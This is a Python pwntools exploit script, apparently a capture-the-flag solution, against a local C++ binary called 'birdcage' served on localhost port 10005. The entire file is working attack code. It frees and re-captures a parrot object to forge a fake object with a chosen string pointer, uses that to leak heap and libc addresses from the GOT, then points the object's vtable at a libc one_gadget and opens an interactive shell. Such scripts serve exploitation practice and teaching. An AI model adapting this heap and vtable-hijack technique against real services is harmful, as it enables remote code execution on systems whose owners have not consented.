from pwn import *


binpath = './birdcage'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
set $vtable=0x0000000000604D08
b *0x000000000040246F
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('localhost', 10005)


def capture(index, data):
    io.sendline(b'capture %d parrot' % index)
    io.sendlineafter(b'Talk to: ', data)
    io.recvuntil(b'> ')


def sing(index):
    io.sendline(b'sing %d' % index)
    data = io.recvuntil(b'> ')
    return data[:data.rfind(b'> ')].rstrip()


def release(index):
    io.sendline(b'release %d' % index)
    io.recvuntil(b'> ')


def solve():
    capture(0, b'A' * 8)
    capture(1, b'B' * 8)

    def read(addr):
        release(0)
        payload = b''
        payload += p64(0xdeadbeefdeadbeef)  # string._M_local_buf
        payload += p64(0xdeadbeefdeadbeef)  # string._M_local_buf
        payload += p64(0x31)  # heap chunk size
        payload += p64(0x0000000000604D08)  # vtable = (vtable for Parrot + 0x10)
        payload += p64(addr)  # string._M_p
        capture(0, payload)
        data = sing(1)
        return u64(data.ljust(8, b'\x00'))

    addr_heap = read(0x605380) - 0x10 # leak heap stored in cage
    print("addr_heap = 0x{:x}".format(addr_heap))

    addr_libc = read(0x0000000000604fe8) - libc.symbols.__libc_start_main
    print("addr_libc = 0x{:x}".format(addr_libc))

    one_gadget_offsets = [324293, 324386, 1090444]
    addr_gadget = addr_libc + one_gadget_offsets[1]

    release(0)
    payload = b''
    payload += b'C' * 0x8
    payload += p64(addr_gadget)  # fake vtable
    payload += p64(0x31)
    payload += p64(addr_heap + 0x30)  # point vtable to fake vtable
    capture(0, payload)

    print("Now cage[0]->sing() is overwritten to one gadget")
    io.sendline(b'sing 1')
    io.interactive()


if __name__ == '__main__':
    solve()
